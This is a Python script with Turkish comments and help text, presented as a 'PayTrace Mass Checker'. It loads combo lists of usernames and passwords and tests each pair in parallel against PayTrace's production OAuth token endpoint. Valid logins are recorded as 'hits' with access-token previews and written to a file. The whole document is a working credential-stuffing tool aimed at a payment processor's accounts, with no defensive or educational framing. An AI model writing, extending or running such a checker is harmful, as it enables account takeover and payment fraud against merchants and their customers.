"""
PayTrace Mass Checker (Token API)
OAuth 2.0 password grant - toplu username password kontrolü.

Dosya formatı (her satırda):
  user pass
  user:pass
  user|pass
"""

import requests
import sys
import argparse
import json
import threading
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

PAYTRACE_TOKEN_URL = "https://api.paytrace.com/oauth/token"
PAYTRACE_SANDBOX_TOKEN_URL = "https://api.sandbox.paytrace.com/oauth/token"

lock = threading.Lock()
stats = {"valid": 0, "invalid": 0, "error": 0, "checked": 0, "total": 0}


def get_token(username: str, password: str, sandbox: bool = False, timeout: int = 30) -> dict:
    url = PAYTRACE_SANDBOX_TOKEN_URL if sandbox else PAYTRACE_TOKEN_URL
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
    }
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
    }

    try:
        resp = requests.post(url, headers=headers, data=data, timeout=timeout)
        return {"status_code": resp.status_code, "body": resp.json()}
    except requests.exceptions.Timeout:
        return {"status_code": None, "error": "Timeout"}
    except requests.exceptions.ConnectionError:
        return {"status_code": None, "error": "Connection failed"}
    except requests.exceptions.JSONDecodeError:
        return {"status_code": resp.status_code, "error": "Bad JSON", "raw": resp.text}


def check_one(username: str, password: str, sandbox: bool = False, retries: int = 2) -> dict:
    for attempt in range(retries + 1):
        result = get_token(username, password, sandbox=sandbox)

        if result.get("error") and attempt < retries:
            time.sleep(1 * (attempt + 1))
            continue

        if result.get("error"):
            return {"user": username, "pass": password, "status": "ERROR", "detail": result["error"]}

        body = result.get("body", {})
        if result["status_code"] == 200 and "access_token" in body:
            return {
                "user": username,
                "pass": password,
                "status": "HIT",
                "token": body["access_token"],
                "token_type": body.get("token_type", "Bearer"),
                "expires_in": body.get("expires_in", ""),
            }

        return {
            "user": username,
            "pass": password,
            "status": "BAD",
            "detail": body.get("error_description", body.get("error", "")),
        }

    return {"user": username, "pass": password, "status": "ERROR", "detail": "Max retries"}


def parse_line(line: str):
    """user pass / user:pass / user|pass formatlarını parse et."""
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    for sep in [":", "|", " ", "\t"]:
        if sep in line:
            parts = line.split(sep, 1)
            if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                return parts[0].strip(), parts[1].strip()

    return None


def load_combos(filepath: str) -> list[tuple[str, str]]:
    combos = []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            parsed = parse_line(line)
            if parsed:
                combos.append(parsed)
    return combos


def progress_bar():
    with lock:
        done = stats["checked"]
        total = stats["total"]
        hits = stats["valid"]
        bad = stats["invalid"]
        err = stats["error"]

    if total == 0:
        return

    pct = done / total * 100
    bar_len = 30
    filled = int(bar_len * done / total)
    bar = "█" * filled + "░" * (bar_len - filled)

    sys.stdout.write(
        f"\r  [{bar}] {pct:5.1f}%  "
        f"Checked: {done}/{total}  "
        f"\033[92mHits: {hits}\033[0m  "
        f"\033[91mBad: {bad}\033[0m  "
        f"\033[93mErr: {err}\033[0m  "
    )
    sys.stdout.flush()


def worker(username, password, sandbox, hits_file, retries):
    res = check_one(username, password, sandbox=sandbox, retries=retries)

    with lock:
        stats["checked"] += 1
        if res["status"] == "HIT":
            stats["valid"] += 1
            if hits_file:
                with open(hits_file, "a") as f:
                    f.write(f"{res['user']} {res['pass']}\n")
        elif res["status"] == "BAD":
            stats["invalid"] += 1
        else:
            stats["error"] += 1

    progress_bar()
    return res


def print_hit(res: dict):
    token_preview = res["token"][:24] + "..." if len(res["token"]) > 24 else res["token"]
    print(
        f"\n  \033[92m[HIT]\033[0m {res['user']} {res['pass']}  "
        f"token={token_preview}  expires={res['expires_in']}s"
    )


def main():
    parser = argparse.ArgumentParser(
        description="PayTrace Mass Checker (Token API)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Kullanım:
  python paytrace_checker.py -f combo.txt
  python paytrace_checker.py -f combo.txt -t 10 --sandbox
  python paytrace_checker.py -f combo.txt -t 5 -o hits.txt
  python paytrace_checker.py -u admin -p test123

combo.txt formatı (her satırda):
  user pass
  user:pass
  user|pass
        """,
    )

    parser.add_argument("-f", "--file", help="Combo dosyası (user pass / user:pass / user|pass)")
    parser.add_argument("-u", "--username", help="Tek kullanıcı adı")
    parser.add_argument("-p", "--password", help="Tek şifre")
    parser.add_argument("-t", "--threads", type=int, default=3, help="Thread sayısı (varsayılan: 3)")
    parser.add_argument("-o", "--output", help="Hit sonuçlarını kaydet (varsayılan: hits_<tarih>.txt)")
    parser.add_argument("--retries", type=int, default=2, help="Hata durumunda tekrar deneme (varsayılan: 2)")
    parser.add_argument("--sandbox", action="store_true", help="Sandbox ortamı kullan")
    parser.add_argument("--json", action="store_true", dest="json_output", help="Sonuçları JSON olarak yazdır")
    parser.add_argument("--timeout", type=int, default=30, help="İstek zaman aşımı saniye (varsayılan: 30)")

    args = parser.parse_args()

    if not args.username and not args.file:
        parser.error("-f (dosya) veya -u/-p (tek kontrol) gerekli")
    if args.username and not args.password:
        parser.error("-u verildiğinde -p de gerekli")

    env = "SANDBOX" if args.sandbox else "PRODUCTION"
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print()
    print("  ╔══════════════════════════════════════════════╗")
    print("  ║      PayTrace Mass Checker (Token API)       ║")
    print("  ╚══════════════════════════════════════════════╝")
    print(f"  Ortam    : {env}")
    print(f"  Tarih    : {now}")

    if args.file:
        combos = load_combos(args.file)
        if not combos:
            print("  \033[91mDosyada geçerli combo bulunamadı.\033[0m")
            sys.exit(1)

        hits_file = args.output or f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        print(f"  Dosya    : {args.file}")
        print(f"  Combo    : {len(combos)}")
        print(f"  Thread   : {args.threads}")
        print(f"  Hits     : {hits_file}")
        print("  " + "─" * 46)

        stats["total"] = len(combos)
        all_results = []

        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futures = {
                pool.submit(worker, u, p, args.sandbox, hits_file, args.retries): (u, p)
                for u, p in combos
            }
            for future in as_completed(futures):
                res = future.result()
                all_results.append(res)
                if res["status"] == "HIT":
                    print_hit(res)

        print("\n")
        print("  " + "─" * 46)
        print(f"  \033[1mSONUÇ\033[0m")
        print(f"  Toplam   : {stats['total']}")
        print(f"  \033[92mHit      : {stats['valid']}\033[0m")
        print(f"  \033[91mBad      : {stats['invalid']}\033[0m")
        print(f"  \033[93mError    : {stats['error']}\033[0m")

        if stats["valid"] > 0:
            print(f"\n  \033[92mHitler kaydedildi -> {hits_file}\033[0m")

        if args.json_output:
            safe = []
            for r in all_results:
                entry = dict(r)
                if "token" in entry:
                    entry["token"] = entry["token"][:24] + "..."
                safe.append(entry)
            print("\n" + json.dumps(safe, indent=2, ensure_ascii=False))

    else:
        print(f"  Kullanıcı: {args.username}")
        print("  " + "─" * 46)

        res = check_one(args.username, args.password, sandbox=args.sandbox, retries=args.retries)

        if res["status"] == "HIT":
            print_hit(res)
        elif res["status"] == "BAD":
            print(f"\n  \033[91m[BAD]\033[0m {res['user']} {res['pass']}  -> {res.get('detail', '')}")
        else:
            print(f"\n  \033[93m[ERROR]\033[0m {res['user']} {res['pass']}  -> {res.get('detail', '')}")

        if args.json_output:
            entry = dict(res)
            if "token" in entry:
                entry["token"] = entry["token"][:24] + "..."
            print("\n" + json.dumps(entry, indent=2, ensure_ascii=False))

    print()


if __name__ == "__main__":
    main()
